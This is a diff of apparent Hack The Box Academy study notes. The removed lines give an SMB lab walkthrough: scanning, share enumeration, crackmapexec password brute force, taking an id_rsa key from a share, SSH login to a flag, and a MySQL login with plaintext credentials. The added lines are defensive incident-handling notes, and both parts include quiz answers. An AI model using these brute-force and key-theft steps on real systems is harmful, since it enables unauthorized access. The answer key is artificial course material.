-Host is up (0.63s latency).
-
-PORT    STATE SERVICE     VERSION
-139/tcp open  netbios-ssn Samba smbd 4.6.2
-445/tcp open  netbios-ssn Samba smbd 4.6.2
-
-Host script results:
-|_nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
-| smb2-time: 
-|   date: 2025-11-12T12:52:55
-|_  start_date: N/A
-| smb2-security-mode: 
-|   3:1:1: 
-|_    Message signing enabled but not required
-|_clock-skew: -17s
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 13.87 seconds
-
-```
-
-Using smbmap we get our answer:&#x20;
-
-```
-┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-501m42wwds]─[~/Desktop]
-└──╼ [★]$ smbmap -H 10.129.232.68
-[+] IP: 10.129.232.68:445	Name: 10.129.232.68                                     
-        Disk                                                  	Permissions	Comment
-	----                                                  	-----------	-------
-	print$                                            	NO ACCESS	Printer Drivers
-	GGJ                                               	READ ONLY	Priv
-	IPC$                                              	NO ACCESS	IPC Service (attcsvc-linux Samba)
-
-```
-
-Answer: GGJ
-
-Question: What is the password for the username "jason"?
-
-First download the password resources list and unzip from hackthebox.
-
-```
-└──╼ [★]$ wget https://academy.hackthebox.com/storage/resources/pws.zip
---2025-11-12 06:56:44--  https://academy.hackthebox.com/storage/resources/pws.zip
-Resolving academy.hackthebox.com (academy.hackthebox.com)... 109.176.239.69, 109.176.239.70
-Connecting to academy.hackthebox.com (academy.hackthebox.com)|109.176.239.69|:443... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 1584 (1.5K) [application/zip]
-Saving to: ‘pws.zip’
-
-pws.zip                                         100%[=====================================================================================================>]   1.55K  --.-KB/s    in 0s      
-
-2025-11-12 06:56:44 (25.1 MB/s) - ‘pws.zip’ saved [1584/1584]
-
-```
-
-And then start brute forcing with the list:
-
-```
-┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-501m42wwds]─[~/Desktop]
-└──╼ [★]$  crackmapexec smb 10.129.232.68 -u 'jason' -p pws.list --local-auth
-[*] First time use detected
-[*] Creating home directory structure
-[*] Creating missing folder logs
-[*] Creating missing folder modules
-[*] Creating missing folder protocols
-[*] Creating missing folder workspaces
-[*] Creating missing folder obfuscated_scripts
-[*] Creating missing folder screenshots
-[*] Creating default workspace
-[*] Initializing MSSQL protocol database
-[*] Initializing WINRM protocol database
-[*] Initializing LDAP protocol database
-[*] Initializing SMB protocol database
-[*] Initializing SSH protocol database
-[*] Initializing VNC protocol database
-[*] Initializing WMI protocol database
-[*] Initializing FTP protocol database
-[*] Initializing RDP protocol database
-[*] Copying default configuration file
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [*] Windows 6.1 Build 0 (name:ATTCSVC-LINUX) (domain:ATTCSVC-LINUX) (signing:False) (SMBv1:False)
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:liverpool STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:theman STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:bandit STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:dolphins STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:maddog STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:packers STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:jaguar STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:lovers STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:nicholas STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:united STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:tiffany STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:maxwell STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:zzzzzz STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:nirvana STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:jeremy STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:suckit STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:stupid STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:porn STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:monica STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:elephant STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:giants STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:jackass STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:hotdog STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:rosebud STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:success STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:debbie STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:mountain STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:444444 STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:xxxxxxxx0 STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:warrior STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:1q2w3e4r5t STATUS_LOGON_FAILURE 
-SMB         10.129.232.68   445    ATTCSVC-LINUX    [+] ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh 
-```
-
-We get our answer: 34c8zuNBo91!@28Bszh
-
-Question: Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.
-
-Method:&#x20;
-
-So from here I realised we had went on smbmap but done nothing with it, so if we include the -R flag we will be able to find the following:
-
-```
-┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-501m42wwds]─[~/Desktop]
-└──╼ [★]$ smbmap -H 10.129.232.68 -R
-[+] IP: 10.129.232.68:445	Name: 10.129.232.68                                     
-        Disk                                                  	Permissions	Comment
-	----                                                  	-----------	-------
-	print$                                            	NO ACCESS	Printer Drivers
-	GGJ                                               	READ ONLY	Priv
-	.\GGJ\*
-	dr--r--r--                0 Tue Apr 19 16:33:55 2022	.
-	dr--r--r--                0 Mon Apr 18 12:08:30 2022	..
-	fr--r--r--             3381 Tue Apr 19 16:33:03 2022	id_rsa
-	IPC$                                              	NO ACCESS	IPC Service (attcsvc-linux Samba)
-
-```
-
-An id\_rsa, which is a key used to login with ssh so this is obviously something we would need !
-
-```
-┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-501m42wwds]─[~/Desktop]
-└──╼ [★]$ smbclient --user jason //10.129.232.68/GGJ
-Password for [WORKGROUP\jason]:
-Try "help" to get a list of possible commands.
-smb: \> get id_rsa
-getting file \id_rsa of size 3381 as id_rsa (19.2 KiloBytes/sec) (average 19.2 KiloBytes/sec)
-smb: \> 
-
-```
-
-now we can login, we need to update the file permissions using chmod.
-
-```
-┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-501m42wwds]─[~/Desktop]
-└──╼ [★]$ chmod 700 id_rsa
-┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-501m42wwds]─[~/Desktop]
-└──╼ [★]$ ssh jason@10.129.232.68 -i id_rsa
-The authenticity of host '10.129.232.68 (10.129.232.68)' can't be established.
-ED25519 key fingerprint is SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.129.232.68' (ED25519) to the list of known hosts.
-Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Wed 12 Nov 2025 01:08:50 PM UTC
-
-  System load:  0.0                Processes:               226
-  Usage of /:   28.4% of 13.72GB   Users logged in:         0
-  Memory usage: 13%                IPv4 address for ens160: 10.129.232.68
-  Swap usage:   0%
-
- * Super-optimized for small spaces - read how we shrank the memory
-   footprint of MicroK8s to make it the smallest full K8s around.
-
-   https://ubuntu.com/blog/microk8s-memory-optimisation
-
-1 update can be applied immediately.
-1 of these updates is a standard security update.
-To see these additional updates run: apt list --upgradable
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-
-Last login: Tue Apr 19 21:50:46 2022 from 10.10.14.20
-$ ls
-flag.txt
-$ cat flag.txt
-HTB{SMB_4TT4CKS_2349872359}
-$ 
-
-```
-
-Answer: HTB{SMB\_4TT4CKS\_2349872359}
+Answer: False
 
 ***
 
-### Attacking SQL Databases
+### Preparation Stage
 
-#### Enumeration
+The first is the establishment of incident handling capability within the organization. The second is the ability to protect against and prevent IT security incidents by implementing appropriate protective measures
 
-By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port. We can use `Nmap`'s default scripts `-sC` option to enumerate database services on a target system:
+### Clear Policies & Documentation
 
-```shell-session
-0xgrooted@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125
+Some of the written policies and documentation should contain an up-to-date version of the following information:
 
-Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
-Nmap scan report for 10.10.10.125
-Host is up (0.0099s latency).
+* Contact information and roles of the incident handling team members.
+* Contact information for the legal and compliance department, management team, IT support, communications and media relations department, law enforcement, internet service providers, facility management, and external incident response team.
+* Incident response policy, plan, and procedures.
+* Incident information sharing policy and procedures.
+* Baselines of systems and networks, out of a golden image and a clean state environment.
+* Network diagrams.
+* Organization-wide asset management database.
+* User accounts with excessive privileges that can be used on-demand by the team when necessary (also for business-critical systems, which are handled with the skills needed to administer that specific system). These user accounts are normally enabled when an incident is confirmed during the initial investigation and then disabled once it is over. A mandatory password reset is also performed when disabling the users.
+* Ability to acquire hardware, software, or an external resource without a complete procurement process (urgent purchase of up to a certain amount). The last thing you need during an incident is to wait for weeks for the approval of a $500 tool.
+* Forensic/Investigative cheat sheets.
 
-PORT     STATE SERVICE  VERSION
-1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
-| ms-sql-ntlm-info: 
-|   Target_Name: HTB
-|   NetBIOS_Domain_Name: HTB
-|   NetBIOS_Computer_Name: mssql-test
-|   DNS_Domain_Name: HTB.LOCAL
-|   DNS_Computer_Name: mssql-test.HTB.LOCAL
-|   DNS_Tree_Name: HTB.LOCAL
-|_  Product_Version: 10.0.17763
-| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
-| Not valid before: 2021-08-26T01:04:36
-|_Not valid after:  2051-08-26T01:04:36
-|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.
+### Tools (Software & Hardware)
 
-Host script results:
-|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
-| ms-sql-info: 
-|   10.10.10.125:1433: 
-|     Version: 
-|       name: Microsoft SQL Server 2017 RTM
-|       number: 14.00.1000.00
-|       Product: Microsoft SQL Server 2017
-|       Service pack level: RTM
-|       Post-SP patches applied: false
-|_    TCP port: 1433
+Moving forward, we also need to ensure that we have the right tools to perform the job. These include, but are not limited to:
+
+* An additional laptop or a forensic workstation for each incident handling team member to preserve disk images and log files, perform data analysis, and investigate without any restrictions (we know malware will be tested here, so tools such as antivirus should be disabled). These devices should be handled appropriately and not in a way that introduces risks to the organization.
+* Digital forensic image acquisition and analysis tools.
+* Memory capture and analysis tools.
+* Live response capture and analysis tools.
+* Log analysis tools.
+* Network capture and analysis tools.
+* Network cables and switches.
+* Write blockers.
+* Hard drives for forensic imaging.
+* Power cables.
+* Screwdrivers, tweezers, and other relevant tools to repair or disassemble hardware devices if needed.
+* Indicator of Compromise (IOC) creator and the ability to search for IOCs across the organization.
+* Chain of custody forms.
+* Encryption software.
+* Ticket tracking system.
+* Secure facility for storage and investigation.
+* Incident handling system independent of your organization's infrastructure.
+
+Question: What should we have prepared and always ready to 'grab and go'?
+
+Answer: jump bag
+
+Question: True or False: Using baselines, we can discover deviations from the golden image, which aids us in discovering suspicious or unwanted changes to the configuration.
+
+Answer: True
+
+**DMARC**&#x20;
+
+[DMARC](https://dmarcly.com/blog/how-to-implement-dmarc-dkim-spf-to-stop-email-spoofing-phishing-the-definitive-guide#what-is-dmarc) is an email protection mechanism against phishing built on top of the already existing [SPF](https://dmarcly.com/blog/how-to-implement-dmarc-dkim-spf-to-stop-email-spoofing-phishing-the-definitive-guide#what-is-spf) and [DKIM](https://dmarcly.com/blog/how-to-implement-dmarc-dkim-spf-to-stop-email-spoofing-phishing-the-definitive-guide#what-is-dkim). The idea behind DMARC is to reject emails that 'pretend' to originate from our organisation.
+
+**Endpoint Hardening & EDR**
+
+Endpoint devices (workstations, laptops, etc.) are the entry points for most of the attacks that we face on a daily basis. Considering that most threats will originate from the internet and target users who are browsing websites, opening attachments, or running malicious executables, a significant percentage of this activity will occur on their corporate endpoints.
+
+There are a few widely recognized endpoint hardening standards now, with CIS and Microsoft baselines being the most popular, and these should really be the building blocks for our organization's hardening baselines. Some highly important actions (that actually work) to note and do something about are:
+
+* Disable LLMNR/NetBIOS.
+* Implement LAPS and remove administrative privileges from regular users.
+* Disable or configure PowerShell in "ConstrainedLanguage" mode.
+* Enable Attack Surface Reduction (ASR) rules if using Microsoft Defender.
+* Implement whitelisting. We know this is nearly impossible to implement. Consider at least blocking execution from user-writable folders (Downloads, Desktop, AppData, etc.). These are the locations where exploits and malicious payloads will initially find themselves. Remember to also block script types such as .hta, .vbs, .cmd, .bat, .js, and similar. We need to pay attention to [LOLBin](https://lolbas-project.github.io/) files while implementing whitelisting. Do not overlook them; they are really used in the wild as initial access to bypass whitelisting.
+* Utilize host-based firewalls. As a bare minimum, block workstation-to-workstation communication and block outbound traffic to LOLBins.
+* Deploy an EDR product. At this point in time, [AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps) provides great visibility into obfuscated scripts for antimalware products to inspect the content before it gets executed. It is highly recommended that we only choose products that integrate with AMSI.
+
+**Network Protection**
+
+Network segmentation is a powerful technique for preventing a breach from spreading across the entire organization. Business-critical systems must be isolated, and connections should be allowed only as required by the business. Internal resources should not face the Internet directly (unless placed in a DMZ).
+
+Additionally, when speaking of network protection, we should consider IDS/IPS (Intrusion Detection System/Intrusion Prevention System) systems. Their power really shines when SSL/TLS interception is performed so that they can identify malicious traffic based on content on the wire and not based on the reputation of IP addresses, which is a traditional and very inefficient way of detecting malicious traffic.
+
+Additionally, ensure that only organization-approved devices can access the network. Solutions such as 802.1x can be utilized to reduce the risk of bring your own device (BYOD) or malicious devices connecting to the corporate network. If we are a cloud-only company using, for example, Azure/Azure AD (now called Microsoft Entra ID), then we can achieve similar protection with Conditional Access policies that will allow access to organization resources only if we are connecting from a company-managed device.
+
+**Privilege Identity Management / MFA/ Passwords**
+
+At this point in time, stealing privileged user credentials is the most common escalation path in Active Directory environments. Additionally, a common mistake is that admin users either have a weak (but often complex) password or a shared password with their regular user account (which can be obtained via multiple attack vectors such as keylogging). For reference, a weak but complex password is "Password1!". It includes uppercase, lowercase, numerical, and special characters, but despite this, it's easily predictable and can be found in many password lists that adversaries employ in their attacks. It is recommended to teach employees to use passphrases because they are harder to guess and difficult to brute force. An example of a passphrase that is easy to remember yet long and complex is "i LIK3 my coffeE warm". If one knows a second language, they can mix up words from multiple languages for additional protection.
+
+Multi-factor authentication (MFA) is another identity-protecting solution that should be implemented at least for any type of administrative access to `all` applications and devices.\
+
+
+Question: What mechanism can we use to block phishing emails pretending to originate from our mail server?
+
+Answer: DMARC
+
+Question: True or False: The "Summer2021!" password meets the complex password criteria but can be easily guessed or brute-forced.
+
+Answer: True
+
+***
+
+### Detection & Analysis
+
+The `Detection & Analysis` stage involves all aspects of detecting an incident, such as utilizing sensors, logs, and trained personnel. It also includes information and knowledge sharing, as well as utilizing context-based threat intelligence. Segmentation of the architecture and having a clear understanding of and visibility within the network are also important factors.
+
+Threats are introduced to the organization via an infinite number of attack vectors, and their detection can come from sources such as:
+
+* An employee who notices abnormal behavior.
+* An alert from one of our tools (EDR, IDS, Firewall, SIEM, etc.).
+* Threat hunting activities.
+* A third-party notification informing us that they discovered signs of our organization being compromised.
+
+It is highly recommended to create levels of detection by logically categorizing our network as follows:
+
+* Detection at the network perimeter (using firewalls, internet-facing network intrusion detection/prevention systems, demilitarized zone, etc.).
+* Detection at the internal network level (using local firewalls, host intrusion detection/prevention systems, etc.).
+* Detection at the endpoint level (using antivirus systems, endpoint detection & response systems, etc.).
+* Detection at the application level (using application logs, service logs, etc.).
+
+### Initial Investigation
+
+When a security incident is detected, we should conduct some initial investigation and establish context before assembling the team and calling an organization-wide incident response. Think about how information is presented in the event of an administrative account connecting to an IP address at HH:MM:SS. Without knowing what system is on that IP address and which time zone the time refers to, we may easily jump to the wrong conclusion about what this event is about. To sum up, we should aim to collect as much information as possible at this stage about the following:
+
+* Date/Time when the incident was reported. Additionally, who detected the incident and/or who reported it?
+* How was the incident detected?
+* What was the incident? Phishing? System unavailability? etc.
+* Assemble a list of impacted systems (if relevant).
+* Document who has accessed the impacted systems and what actions have been taken. Make a note of whether this is an ongoing incident or if the suspicious activity has been stopped.
+* Physical location, operating systems, IP addresses and hostnames, system owner, system's purpose, current state of the system.
+* List of IP addresses, if malware is involved, time and date of detection, type of malware, systems impacted, export of malicious files with forensic information on them (such as hashes, copies of the files, etc.).
+
+With that information at hand, we can make decisions based on the knowledge we have gathered. What does this mean? We would likely take different actions if we knew that the CEO's laptop was compromised as opposed to an intern's.
+
+With the initially gathered information, we can start building an incident timeline. This timeline will keep us organized throughout the event and provide an overall picture of what happened. The events in the timeline are sorted based on when they occurred. Note that during the investigative process later on, we will not necessarily uncover evidence in this chronological order. However, when we sort the evidence based on when it occurred, we will get context from the separate events that took place. The timeline can also shed light on whether newly discovered evidence is part of the current incident. For example, imagine that what we thought was the initial payload of an attack was later discovered to be present on another device two weeks ago. We will encounter situations where the data we are looking at is extremely relevant and situations where the data is unrelated and we are looking in the wrong place. Overall, the timeline should contain the information described in the following columns:
+
+| `Date` | `Time of the event` | `hostname` | `event description` | `data source` |
+| ------ | ------------------- | ---------- | ------------------- | ------------- |
+
+**Incident Severity & Extent Questions**
+
+When handling a security incident, we should also try to answer the following questions to get an idea of the incident's severity and extent:
+
+* What is the exploitation impact?
+* What are the exploitation requirements?
+* Can any business-critical systems be affected by the incident?
+* Are there any suggested remediation steps?
+* How many systems have been impacted?
+* Is the exploit being used in the wild?
+* Does the exploit have any worm-like capabilities?
+
+The last two can possibly indicate the level of sophistication of an adversary.
+
+As you can imagine, high-impact incidents will be handled promptly, and incidents with a high number of impacted systems will have to be escalated.
+
+Question: True or False: Can a third-party vendor be a source of detecting a compromise?
+
+Answer: True
+
+Question: Assign the Mimikatz alert (shown in the section) to yourself in TheHive, and go through the description and summary. Provide the username of the person who executed the Mimikatz tool. The answer format is "domain\user\_name."
+
+Method: Go to the hive and find the event HTB are referencing and then check the summary.
+
+Answer: insight\svc\_deployer
+
+When an investigation is started, we aim to understand `what happened` and `how it happened`. To analyze the incident-related data properly and efficiently, the incident handling team members need deep technical knowledge and experience in the field. One may ask, "Why do we care about how an incident happened? Why don't we simply rebuild the impacted systems and basically forget it ever happened?"
+
+If we don't know how an incident happened or what was impacted, then any remedial steps we take will not ensure that the attacker cannot repeat their actions to regain access. If we, on the other hand, know exactly how the adversary got in, what tools they used, and which systems were impacted, then we can plan our remediation to ensure that this attack path cannot be replicated.
+
+### The Investigation
+
+The investigation starts based on the initially gathered (and limited) information that contains what we know about the incident so far. With this initial data, we will begin a 3-step cyclic process that will iterate over and over again as the investigation evolves. This process includes:
+
+* Creation and usage of indicators of compromise (IOCs).
+* Identification of new leads and impacted systems.
+* Data collection and analysis from the new leads and impacted systems.
+
+![Flowchart showing investigation process: Initial Investigation Data leads to IOCs, Compromised Systems, and Collection & Analysis.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/148/ir-ioc.png)
+
+Let us now elaborate more on the process depicted above.
+
+***
+
+#### Initial Investigation Data
+
+In order to reach a conclusion, an investigation should be based on valid leads that have been discovered not only during this initial phase but throughout the entire investigation process. The incident handling team should constantly bring up new leads and not focus solely on a specific finding, such as a known malicious tool. Narrowing an investigation down to a specific activity often results in limited findings, premature conclusions, and an incomplete understanding of the overall impact.
+
+***
+
+#### Creation & Usage Of IOCs
+
+An indicator of compromise (IOC) is a `sign that an incident has occurred`. IOCs are documented in a structured manner, which represents the `artifacts` of the compromise. Examples of IOCs can be IP addresses, hash values of files, and file names. In fact, because IOCs are so important to an investigation, special languages such as `OpenIOC` have been developed to document them and share them in a standard manner. Another widely used standard for IOCs is `YARA`. There are a number of free tools that can be utilized, such as Mandiant's `IOC Editor`, to create or edit IOCs. Using these languages, we can describe and use the artifacts that we uncover during an incident investigation. We may even obtain IOCs from third parties if the adversary or the attack is known. For example, CISA publishes the IOCs in a format called `STIX` (`Structured Threat Information eXpression`). STIX is an open-source, machine-readable language and serialization format, primarily in JSON, used to exchange cyber threat intelligence (CTI) in a standardized and consistent way.
+
+As an example, in [this report](https://www.cisa.gov/news-events/alerts/2025/08/06/cisa-releases-malware-analysis-report-associated-microsoft-sharepoint-vulnerabilities), we can check the "Downloadable copy of IOCs associated with this malware" section for the STIX file, which contains the IOCs in JSON format.
+
+Code: json
+
+```json
+...SNIP...
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--474454e8-d393-5a4f-9069-19631ea9d397",
+            "hashes": {
+                "MD5": "40e609840ef3f7fea94d53998ec9f97f",
+                "SHA-1": "141af6bcefdcf6b627425b5b2e02342c081e8d36",
+                "SHA-256": "3461da3a2ddcced4a00f87dcd7650af48f97998a3ac9ca649d7ef3b7332bd997",
+                "SHA-512": "deaed6b7657cc17261ae72ebc0459f8a558baf7b724df04d8821c7a5355e037a05c991433e48d36a5967ae002459358678873240e252cdea4dcbcd89218ce5c2",
+                "SSDEEP": "384:cMQLQ5VU1DcZugg2YBAxeFMxeFAReF9ReFj4U0QiKy8Mg3AxeFaxeFAReFLxTYma:ElHh1gtX10u5A"
+            },
+            "size": 13373,
+            "name": "osvmhdfl.dll",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
+                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
+            ],
+            "extensions": {
+                "windows-pebinary-ext": {
+                    "pe_type": "dll",
+                    "number_of_sections": 4,
+                    "time_date_stamp": "2025-07-22T08:33:22Z",
+                    "size_of_optional_header": 512,
+                    "sections": [
+                        {
+                            "name": "header",
+                            "size": 512,
+                            "entropy": 2.545281,
+                            "hashes": {
+                                "MD5": "2a11da5809d47c180a7aa559605259b5"
+                            }
+                        },
+                        {
+                            "name": ".text",
+                            "size": 4608,
+                            "entropy": 4.532967,
+                            "hashes": {
+                                "MD5": "531ff1038e010be3c55de9cf1f212b56"
+                            }
+                        },
+                        {
+                            "name": ".rsrc",
+                            "size": 1024,
+                            "entropy": 2.170401,
+                            "hashes": {
+                                "MD5": "ef6793ef1a2f938cddc65b439e44ea07"
+                            }
+                        },
+                        {
+                            "name": ".reloc",
+                            "size": 512,
+                            "entropy": 0.057257,
+                            "hashes": {
+                                "MD5": "403090c0870bb56c921d82a159dca5a3"
+                            }
+                        }
+                    ]
+                }
+            }
+        },
+...SNIP...
 ```
 
-**MySQL - Connecting to the SQL Server**
+In TheHive, we can add IOCs in the observables section of an alert.
 
-```shell-session
-0xgrooted@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
+![TheHive “Observables” tab for alert “\[InsightNexus\] Admin Login via ManageEngine Web Console.” Two observables listed: hostname “manage\[.\]insightnexus\[…\]” and IP “103\[.\]112\[.\]60\[.\]117,” both tagged TLP:AMBER and PAP:AMBER with no reports. On the right, “Adding an Observable” panel shows a Type dropdown (options: autonomous-system, domain, file, filename, fqdn, hash, hostname, ip), and an “Is IOC” toggle (off), plus fields for Tags and Description.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/148/hivealert2.png)
 
-Welcome to the MariaDB monitor. Commands end with ; or \g.
-Your MySQL connection id is 8
-Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)
+To leverage IOCs, we will have to deploy an `IOC-obtaining/IOC-searching tool` (native or third-party and possibly at scale). A common approach is to utilize `WMI` or `PowerShell` for IOC-related operations in Windows environments.
 
-Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+A word of caution! During an investigation, we have to be extra careful to prevent the credentials of our highly privileged user(s) from being cached when connecting to (potentially) compromised systems (or any systems, really). More specifically, we need to ensure that only connection protocols and tools that don't cache credentials upon a successful login are utilized (such as `WinRM`). Windows logons with `logon type 3 (Network Logon)` typically don't cache credentials on the remote systems. The best example of "know your tools" that comes to mind is "PsExec". When "PsExec" is used with explicit credentials, those credentials are cached on the remote machine. When "PsExec" is used without credentials through the session of the currently logged-on user, the credentials are not cached on the remote machine. This is a great example of demonstrating how the same tool leaves different tracks, so we must be aware.
 
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+***
 
-MySQL [(none)]>
+#### Identification Of New Leads & Impacted Systems
+
+After searching for IOCs, we expect to have some hits that reveal other systems with the same signs of compromise. These hits may not be directly associated with the incident we are investigating. Our IOC could be, for example, too generic. We need to identify and `eliminate false positives`. We may also end up in a position where we come across a large number of hits. In this case, we should prioritize the ones we will focus on, ideally those that can provide us with new leads after a potential forensic analysis.
+
+***
+
+#### Data Collection and Analysis from the New Leads and Impacted Systems
+
+Once we have identified systems that include our IOCs, we will want to `collect and preserve the state` of those systems for further analysis in order to uncover new leads and/or answer investigative questions about the incident. Depending on the system, there are multiple approaches to how and what data to collect. Sometimes we want to perform a '`live response`' on a system as it is running, while in other cases, we may want to shut down a system and then perform any analysis on it. Live response is the most common approach, where we collect a predefined set of data that is usually rich in artifacts that may explain what happened to a system. Shutting down a system is not an easy decision when it comes to preserving valuable information because, in many cases, much of the artifacts will only live within the RAM memory of the machine, which will be lost if the machine is turned off. Regardless of the collection approach we choose, it is vital to ensure that minimal interaction with the system occurs to avoid altering any evidence or artifacts.
+
+Once the data has been collected, it is time to analyze it. This is often the most time-consuming process during an incident. Malware analysis and disk forensics are the most common examination types. Any newly discovered and validated leads are added to the timeline, which is constantly updated. Also, note that memory forensics is a capability that is becoming more and more popular and is extremely relevant when dealing with advanced attacks.
+
+Keep in mind that during the data collection process, we should keep track of the `chain of custody` to ensure that the examined data is court-admissible if legal action is to be taken against an adversary.
+
+***
+
+#### Use of AI in Threat Detection
+
+Artificial Intelligence (AI) is transforming how organizations detect, triage, and respond to security incidents. In traditional IR workflows, analysts manually review logs, alerts, and reports. This process usually takes hours or days. AI `automates much of this analysis`, reducing response time and improving accuracy by learning from historical incidents and `identifying behavioral anomalies` faster than humans.
+
+For example: Elastic Security’s "`Attack Discovery`" feature uses generative AI to analyze events from thousands of detections, summarizing and clustering related alerts into an attack story.
+
+AI Attack Discovery leverages `LLMs` (large language models) to analyze alerts in an environment and identify threats. The summary represents an attack and shows relationships among multiple alerts to help us identifying which users and hosts are involved. This also show MITRE ATT\&CK mappings. Here's an example of how the attack discovery looks like:
+
